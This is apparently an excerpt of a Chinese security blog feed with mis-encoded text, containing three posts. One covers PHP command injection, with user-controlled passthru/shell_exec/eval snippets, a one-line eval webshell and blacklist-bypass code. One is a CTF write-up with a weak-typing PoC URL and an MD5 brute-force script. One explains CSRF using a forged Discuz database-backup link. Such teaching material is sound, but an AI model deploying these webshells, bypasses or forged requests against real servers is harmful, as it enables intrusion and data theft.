<p><strong>3ã€passthruï¼š</strong>passthruå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªunixç³»ç»Ÿå‘½ä»¤å¹¶æ˜¾ç¤ºåŸå§‹çš„è¾“å‡ºï¼Œå½“unixç³»ç»Ÿä»¤çš„è¾“å‡ºæ˜¯äºŒè¿›åˆ¶çš„æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦ç›´æ¥è¿”å›å€¼ç»™æµè§ˆå™¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨passthruå‡½æ•°æ¥æ›¿ä»£systemå’Œexecå‡½æ•°ã€‚åŸå‹ä¸ºï¼š</p>
<blockquote>
<p>void passthru(string command,int &amp;teturn_var)</p>
</blockquote>
<p>å…¶ä¸­commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œreturn_varå­˜æ”¾æ‰§è¡Œå‘½ä»¤åçš„çŠ¶æ€å€¼ã€‚</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
passthru($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p><strong>4ã€shell_execï¼š</strong>æ‰§è¡Œshellå‘½ä»¤å¹¶è¿”å›è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œå‡½æ•°åŸå‹ä¸ºuï¼š</p>
<blockquote>
<p>string shell_exec(string command)</p>
</blockquote>
<p>å…¶ä¸­commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
shell_exec($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p><strong>5ã€`è¿ç®—ç¬¦ï¼š</strong>ä¸shell_execåŠŸèƒ½ç›¸åŒï¼Œé€šå¸¸ç”¨äºç»•è¿‡é»‘åå•</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
$output = `$cmd`;
echo &quot;&lt;pre&gt;&quot;;
echo $output;
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p>æ‰§è¡Œç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_4.png" alt=""></p>
<h2 id="0x02-2-evalæ³¨å…¥æ”»å‡»åˆ©ç”¨"><a href="#0x02-2-evalæ³¨å…¥æ”»å‡»åˆ©ç”¨" class="headerlink" title="0x02.2 evalæ³¨å…¥æ”»å‡»åˆ©ç”¨"></a>0x02.2 evalæ³¨å…¥æ”»å‡»åˆ©ç”¨</h2><p>å‡ºæ¥å¯ä»¥åˆ©ç”¨å‡½æ•°å‘½ä»¤æ³¨å…¥æ”»å‡»æ–¹å¼å¤–è¿˜å¯ä»¥ä½¿ç”¨evalæ³¨å…¥æ”»å‡»æ–¹å¼ï¼Œevalå‡½æ•°ä¼šå°†å‚æ•°å­—ç¬¦ä¸²ä½œä¸º<strong>phpç¨‹åºä»£ç </strong>æ¥æ‰§è¡Œï¼Œç”¨æˆ·å¯ä»¥å°†phpä»£ç ä¿å­˜æˆå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œç„¶åä¼ é€’ç»™evalå‡½æ•°æ‰§è¡Œã€‚åŸå‹ä¸ºï¼š</p>
<blockquote>
<p>mixed eval(string code_str)</p>
</blockquote>
<p>å…¶ä¸­code_stræ˜¯phpä»£ç å­—ç¬¦ä¸²ï¼Œé€šè¿‡æ„é€ ä¼ å…¥evalå‡½æ•°ä¸­çš„å…¨éƒ¨æˆ–éƒ¨åˆ†å­—ç¬¦ä¸²çš„å†…å®¹å®ç°å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
eval($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p>å¦‚æœä¼ å…¥çš„å†…å®¹ä¸º<code>phpinfo();</code>,è‹¥ä¼ å…¥çš„æ˜¯ä¸€å¥è¯æœ¨é©¬<code>&lt;?php eval($_POST[cmd]);?&gt;</code>å°±å¯ä»¥ç›´æ¥æ‹¿shellã€‚</p>
<p>ç¤ºä¾‹ç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_5.png" alt=""></p>
<h2 id="0x02-3-PHP-webshellå‘½ä»¤æ‰§è¡Œé˜²å¾¡åŠç»•è¿‡æ–¹æ³•"><a href="#0x02-3-PHP-webshellå‘½ä»¤æ‰§è¡Œé˜²å¾¡åŠç»•è¿‡æ–¹æ³•" class="headerlink" title="0x02.3 PHP webshellå‘½ä»¤æ‰§è¡Œé˜²å¾¡åŠç»•è¿‡æ–¹æ³•"></a>0x02.3 PHP webshellå‘½ä»¤æ‰§è¡Œé˜²å¾¡åŠç»•è¿‡æ–¹æ³•</h2><h3 id="0x02-3-1-PHPç¦æ­¢webshellæ‰§è¡Œå‘½ä»¤é˜²å¾¡"><a href="#0x02-3-1-PHPç¦æ­¢webshellæ‰§è¡Œå‘½ä»¤é˜²å¾¡" class="headerlink" title="0x02.3.1 PHPç¦æ­¢webshellæ‰§è¡Œå‘½ä»¤é˜²å¾¡"></a>0x02.3.1 PHPç¦æ­¢webshellæ‰§è¡Œå‘½ä»¤é˜²å¾¡</h3><p>PHPçš„é…ç½®æ–‡ä»¶php.inié‡Œé¢æœ‰ä¸ªdisable_functions =<br>é…ç½®è¿™ä¸ªï¼Œç¦æ­¢æŸäº›phpå‡½æ•°ï¼Œä¾¿å¯ä»¥ç¦æ­¢phpçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¾‹å¦‚ï¼š</p>
<blockquote>
<p>disable_functions=system,passthru,shell_exec,exec,popen</p>
</blockquote>
<h3 id="0x02-3-2-PHP-webshellå‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹æ³•"><a href="#0x02-3-2-PHP-webshellå‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹æ³•" class="headerlink" title="0x02.3.2 PHP webshellå‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹æ³•"></a>0x02.3.2 PHP webshellå‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹æ³•</h3><p>1.é»‘åå•ç»•è¿‡</p>
<p>phpèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰ï¼š</p>
<blockquote>
<p>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`(åå•å¼•å·)</p>
</blockquote>
<p>æ ¹æ®é»‘åå•ä¸­æ²¡æœ‰çš„å‡½æ•°ï¼Œå³å¯ç»•è¿‡ã€‚</p>
<p>2.ç³»ç»Ÿç»„ä»¶ç»•è¿‡</p>
<p>åªé€‚ç”¨äºwindowsï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
$command = $_POST[a];
$wsh = new COM(&apos;WScript.shell&apos;);    //ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡
$exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command);    //è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput
?&gt;
</code></pre><p>å¦‚ä½•é˜²å¾¡ï¼šç›´æ¥åˆ é™¤system32ä¸‹çš„wshom.ocxæ–‡ä»¶</p>
<p>2.æ‹“å±•åº“ç»•è¿‡</p>
<h2 id="0x02-4-PHP-create-function-æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#0x02-4-PHP-create-function-æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="0x02.4 PHP create_function()æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>0x02.4 PHP create_function()æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>åœ¨PHPä¸­ä½¿ç”¨create_function()åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¸€ä¸ªç®€å•çš„ä»£ç å®¡è®¡å’ŒMD5çˆ†ç ´è„šæœ¬]]></title>
      <url>/2016/07/21/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8CMD5%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h1 id="0x01-phpæ˜¯æœ€å¥½çš„è¯­è¨€"><a href="#0x01-phpæ˜¯æœ€å¥½çš„è¯­è¨€" class="headerlink" title="0x01 phpæ˜¯æœ€å¥½çš„è¯­è¨€"></a>0x01 phpæ˜¯æœ€å¥½çš„è¯­è¨€</h1><p>ä»£ç å®¡è®¡ã€‚</p>
<p>æè¿°ï¼šæ®è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œperfectï¼Ÿæ¥è¯•è¯•çœ‹ã€‚åœ°å€ï¼š<code>http://218.76.35.75:20114/</code><br><a id="more"></a><br>æºç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
show_source(__FILE__);
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET[&apos;foo&apos;]);
if(is_array($a)){
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;
    if(@$a[&quot;bar1&quot;]){
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;
    }
    if(is_array(@$a[&quot;bar2&quot;])){
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);
        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
        $pos===false?die(&quot;nope&quot;):NULL;
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val){
            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET[&apos;cat&apos;];
$d=@$_GET[&apos;dog&apos;];
if(@$c[1]){
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;
        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;
    }
}
if($v1 &amp;&amp; $v2 &amp;&amp; $v3){
    include &quot;flag.php&quot;;
    echo $flag;
}
?&gt;
</code></pre><p><strong>tipsï¼š</strong>åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒä¸€ä¸ªä¸€ä¸ªè¾“å‡ºï¼Œçœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ</p>
<p>æ„é€ æºç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
$v1=0;$v2=0;$v3=0;
//ç»™3ä¸ªå˜é‡èµ‹å€¼
$a=(array)json_decode(@$_GET[&apos;foo&apos;]);
//json_decodeè§£ç ï¼Œæ‰€ä»¥è¦çŸ¥é“ç¼–ç çš„æ ·å¼
var_dump($a);
echo &apos;&lt;/br&gt;&apos;;
var_dump($_GET[&apos;foo&apos;]);
echo &apos;&lt;/br&gt;&apos;;
if(is_array($a)){
    //åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„
    echo ($a[&quot;bar1&quot;]);
    echo &apos;&lt;/br&gt;&apos;;
    echo is_numeric(@$a[&quot;bar1&quot;]);
    echo &apos;&lt;/br&gt;&apos;;
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope1&quot;):NULL;
    //åˆ¤æ–­æ˜¯ä¸æ˜¯çº¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯å°±dieè¾“å‡ºnope1
    if(@$a[&quot;bar1&quot;]){
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;
        //phpå¼±ç±»å‹ï¼Œå…¶ä»–ç±»å‹å’Œæ•´å½¢æ¯”è¾ƒæ—¶ï¼Œå…ˆæŠŠå…¶ä»–ç±»å‹è½¬åŒ–ä¸ºæ•´å½¢
        echo $v1;
        echo &apos;&lt;/br&gt;&apos;;
    }
    if(is_array(@$a[&quot;bar2&quot;])){
        //åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope2&quot;);
        //oræˆç«‹åˆ™dieè¾“å‡ºnope2ï¼Œæ‰€ä»¥éœ€è¦count($a[&quot;bar2&quot;])==5å’Œis_array($a[&quot;bar2&quot;][0])æœ‰å€¼
        echo &quot;good1&quot;;
        echo &apos;&lt;/br&gt;&apos;;
        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
        //æœ‰a2ï¼Œå¹¶ä¸”å€¼ä¸­æœ‰å­—ç¬¦ä¸²â€œnudtâ€
        var_dump($pos);
        $pos===false?die(&quot;nope3&quot;):NULL;
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val){
            $val===&quot;nudt&quot;?die(&quot;nope3&quot;):NULL;
            //bar2ä¸­ä¸èƒ½æœ‰å­—ç¬¦nudt
        }
        $v2=1;
        echo ($v2);
        echo &apos;&lt;/br&gt;&apos;;
    }
}
$c=@$_GET[&apos;cat&apos;];
$d=@$_GET[&apos;dog&apos;];
if(@$c[1]){
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
    //éœ€è¦strcmp($c[1],$d)å’Œ$c[1]!==$dåŒæ—¶æˆç«‹ï¼Œå³$c$dæ—¢ç›¸ç­‰åˆä¸ç›¸ç­‰
    //phpå¼±ç±»å‹ï¼Œstrcmpå‡½æ•°ä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ¯”è¾ƒè¿”å›null
        echo &quot;good2&quot;;
        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope4&quot;):NULL;
        //eregiå‡½æ•°æœ‰ä¸ª%00æˆªæ–­æ¼æ´
        echo &quot;good3&quot;;
        var_dump(strpos(($c[0].$d), &quot;htctf2016&quot;));
        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;
        $c[0]å’Œ$dè¿æ¥è¿”å›å­—ç¬¦ä¸²htctf2016çš„ä½ç½®
        echo &quot;good4&quot;;
    }
    echo $v3;
}
if($v1 &amp;&amp; $v2 &amp;&amp; $v3){
    include &quot;flag.php&quot;;
    echo &quot;helloï¼ŒGet It!&quot;;
    //echo &quot;flag{php_i5_n0t_b4d}&quot;;
}
?&gt;
</code></pre><p>æœ€ç»ˆçš„POCä¸ºï¼š</p>
<blockquote>
<p><code>http://127.0.0.1:8080/hetian/test.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],2,3,4,5],&quot;a2&quot;:&quot;nudt&quot;}&amp;cat[1][]=111&amp;cat[0]=aahtctf2016&amp;dog=%00</code></p>
</blockquote>
<p>æ•ˆæœä¸ºï¼š<br><img src="http://oa8y5guqs.bkt.clouddn.com/hetian_1.png" alt=""></p>
<h1 id="0x02-å¿˜è®°å¯†ç äº†"><a href="#0x02-å¿˜è®°å¯†ç äº†" class="headerlink" title="0x02 å¿˜è®°å¯†ç äº†"></a>0x02 å¿˜è®°å¯†ç äº†</h1><p>æè¿°ï¼šåœ¨è¿™ä¸ªç½‘ç«™ï¼Œè®°å½•äº†å°ä¼™ä¼´ä»¬çš„å¯†ç ã€‚ å¯æ˜¯slashçš„å¯†ç æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°äº†ï¼Œä½ èƒ½å¸®å¿™æ‰¾å‡ºæ¥ä¹ˆ<br>åœ°å€ï¼š<code>http://218.76.35.75:20115</code></p>
<p>MD5çˆ†ç ´pythonè„šæœ¬</p>
<p>æ‰“å¼€å…¶ä»–çš„ä¸¤ä¸ªå‘ç°pageæ˜¯åå­—åŠ ä¸‰ä½æ•°å­—çš„md5å€¼ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code># -*- coding: utf8 -*-
import requests
import hashlib

url = &quot;http://218.76.35.75:20115/index.php?page=&quot;

for id in range(100,999):

    id=str(id)

    id=&apos;slash&apos;+id

    #print id

    payload = hashlib.md5(id).hexdigest()

    poc = url+payload

    #print poc

    conn = requests.get(poc)

    res = conn.content

    res = str(res)

    if res.find(r&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·è¿”å›&quot;)&gt;0 or res.find(r&quot;error!&quot;)&gt;0:

        print &quot;error!&quot;

    else:

        print poc

        print payload

        break
</code></pre><p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/hetian_2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> PHP </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSRFæ¼æ´æ€»ç»“]]></title>
      <url>/2016/07/20/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>CSRFï¼ˆCross-site request forgeryè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ï¼Œä½†å®ƒä¸XSSéå¸¸ä¸åŒï¼Œå¹¶ä¸”æ”»å‡»æ–¹å¼å‡ ä¹ç›¸å·¦ã€‚XSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ä¸XSSæ”»å‡»ç›¸æ¯”ï¼ŒCSRFæ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼ˆå› æ­¤å¯¹å…¶è¿›è¡Œé˜²èŒƒçš„èµ„æºä¹Ÿç›¸å½“ç¨€å°‘ï¼‰å’Œéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸ºæ¯”XSSæ›´å…·å±é™©æ€§ã€‚<br><a id="more"></a></p>
<h1 id="0x01-CSRFæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#0x01-CSRFæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="0x01 CSRFæ˜¯ä»€ä¹ˆï¼Ÿ"></a>0x01 CSRFæ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>ç½‘ç«™æ˜¯é€šè¿‡cookieæ¥è¯†åˆ«ç”¨æˆ·çš„ï¼Œå½“ç”¨æˆ·æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯ä¹‹åæµè§ˆå™¨å°±ä¼šå¾—åˆ°ä¸€ä¸ªæ ‡è¯†å…¶èº«ä»½çš„cookieï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œä»¥åè®¿é—®è¿™ä¸ªç½‘ç«™ä¼šå¸¦ä¸Šè¿™ä¸ªcookieã€‚å¦‚æœè¿™æœŸé—´æµè§ˆå™¨è¢«äººæ§åˆ¶ç€è¯·æ±‚äº†è¿™ä¸ªç½‘ç«™çš„urlï¼Œå¯èƒ½å°±ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½ï¼ˆæ¯”å¦‚ä¿®æ”¹ä¸ªäººèµ„æ–™ï¼‰ã€‚å› ä¸ºè¿™ä¸ªä¸æ˜¯ç”¨æˆ·çœŸæ­£æƒ³å‘å‡ºçš„è¯·æ±‚ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„è¯·æ±‚ä¼ªé€ ï¼›å‘µå‘µï¼Œå› ä¸ºè¿™äº›è¯·æ±‚ä¹Ÿæ˜¯å¯ä»¥ä»ç¬¬ä¸‰æ–¹ç½‘ç«™æäº¤çš„ï¼Œæ‰€ä»¥å‰ç¼€è·¨ç«™äºŒå­—ã€‚</p>
<h1 id="0x02-CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ"><a href="#0x02-CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="0x02 CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ"></a>0x02 CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ</h1><p>ä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p>
<h1 id="0x03-CSRFä¸XSSçš„åŒºåˆ«"><a href="#0x03-CSRFä¸XSSçš„åŒºåˆ«" class="headerlink" title="0x03 CSRFä¸XSSçš„åŒºåˆ«"></a>0x03 CSRFä¸XSSçš„åŒºåˆ«</h1><p>XSSï¼š</p>
<pre><code>æ”»å‡»è€…å‘ç°XSSæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”æ”»å‡»è€…è·å–å—å®³äººçš„cookieâ€”â€”å®Œæˆæ”»å‡»
</code></pre><p>CSRFï¼š</p>
<pre><code>æ”»å‡»è€…å‘ç°CSRFæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”å—å®³äººæ‰§è¡Œä»£ç â€”â€”å®Œæˆæ”»å‡»
</code></pre><p>CSRFå°‘äº†ä¸€ä¸ª è·å–å—å®³äººçš„cookieçš„æ­¥éª¤ã€‚ä¸ºä»€ä¹ˆä¼šå°‘äº†å‘¢ã€‚å› ä¸ºå—å®³äººåœ¨æ‰§è¡Œä»£ç çš„æ—¶å€™å°±å·²ç»å®Œæˆçš„æ”»å‡»ï¼Œè€Œæ”»å‡»è€…å¹¶æ²¡æœ‰å‚ä¸è¿›æ¥ã€‚</p>
<hr>
<p>ä¸¾ä¸ªä¾‹å­æ¥è¯´å§(å—å®³è€…çš„ç½‘å€æ˜¯a.cnï¼Œæ”»å‡»è€…çš„ç½‘å€æ˜¯b.cn)æ”»å‡»è€…æƒ³è¦åœ¨æŸä¸ªç½‘ç«™(ç½‘ç«™æ˜¯æŸä¸ªå¼€æºCMS)æ·»åŠ ä¸Šå¦ä¸€ä¸ªç®¡ç†å‘˜ï¼Œä½†æ˜¯è¿™ä¸ªç½‘ç«™å¹¶æ²¡æœ‰XSSæ¼æ´ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™æ—¶æ”»å‡»è€…å‘ç°äº†è¿™ä¸ªå¼€æºCMSåå°æ·»åŠ ç®¡ç†å‘˜æ—¶å¹¶æ²¡æœ‰åŠ å…¥éªŒè¯ç æˆ–åˆ™tokenï¼Œåªéœ€è¦è¾“å…¥è¦æ·»åŠ çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ç‚¹å‡»ç¡®å®šå°±å¯ä»¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·äº†ã€‚è¿™æ—¶å’Œæˆ‘ä¸€æ ·èªæ˜çš„æ”»å‡»è€…åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªhtmlæ–‡ä»¶(å‡è®¾åœ°å€æ˜¯b.cn/index.html)ã€‚ç„¶åå°±ç»™ç½‘ç«™ç®¡ç†å‘˜å‘é‚®ä»¶ç­‰ç­‰ï¼Œè¯±ä½¿ç®¡ç†å‘˜æ‰“å¼€b.cn/index.htmlã€‚å½“ç®¡ç†å‘˜æ‰“å¼€åï¼ˆè¿™æ—¶ç®¡ç†å‘˜æ­£åœ¨ç½‘ç«™åå°ï¼Œæˆ–åˆ™ç®¡ç†å‘˜çš„sessionå¹¶æ²¡æœ‰å¤±æ•ˆçš„è¯ï¼‰ï¼Œå°±å¯ä»¥ç¥ä¸çŸ¥é¬¼ä¸è§‰çš„åœ¨ç½‘ç«™åå°æ·»åŠ äº†ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚</p>
<p><strong>CSRFçš„ä¸¤ä¸ªä¾§é‡ç‚¹ï¼š</strong></p>
<pre><code>1.csrfçš„æ”»å‡»å»ºç«‹åœ¨æµè§ˆå™¨å’ŒwebæœåŠ¡å™¨çš„ä¼šè¯ä¹‹ä¸­
2.æ¬ºéª—ç”¨æˆ·è®¿é—®æ¶æ„url
</code></pre><h1 id="0x04-CSRFå®ä¾‹"><a href="#0x04-CSRFå®ä¾‹" class="headerlink" title="0x04 CSRFå®ä¾‹"></a>0x04 CSRFå®ä¾‹</h1><h4 id="0x04-1-CSRFå¿«é€Ÿè„±åº“"><a href="#0x04-1-CSRFå¿«é€Ÿè„±åº“" class="headerlink" title="0x04_1 CSRFå¿«é€Ÿè„±åº“"></a>0x04_1 CSRFå¿«é€Ÿè„±åº“</h4><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œç®¡ç†å‘˜å¤‡ä»½æ•°æ®åº“çš„æ–¹æ³•æ˜¯è¿›å…¥ç®¡ç†é¡µé¢-ç®¡ç†ä¸­å¿ƒ-æ•°æ®å¤‡ä»½</p>
<p>æˆ‘ä»¬ç°åœ¨ç”¨æ™®é€šç”¨æˆ·åˆ©ç”¨CSRFæ¼æ´æ¥å¤‡ä»½ç½‘ç«™çš„æ•°æ®åº“ã€‚</p>
<h4 id="ç¬¬ä¸€æ­¥ï¼šå»ºä¸ªç”¨æˆ·-æ™®é€šæƒé™"><a href="#ç¬¬ä¸€æ­¥ï¼šå»ºä¸ªç”¨æˆ·-æ™®é€šæƒé™" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå»ºä¸ªç”¨æˆ·,æ™®é€šæƒé™"></a>ç¬¬ä¸€æ­¥ï¼šå»ºä¸ªç”¨æˆ·,æ™®é€šæƒé™</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_1.png" alt=""></p>
<h4 id="ç¬¬äºŒæ­¥ï¼šæ„é€ å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥"><a href="#ç¬¬äºŒæ­¥ï¼šæ„é€ å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šæ„é€ å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥"></a>ç¬¬äºŒæ­¥ï¼šæ„é€ å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥</h4><blockquote>
<p><a href="http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa" target="_blank" rel="external">http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa</a></p>
</blockquote>
<p><strong>æ³¨ï¼š</strong>è¿™ä¸ªé“¾æ¥å°±æ˜¯adminæ­£å¸¸å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥</p>
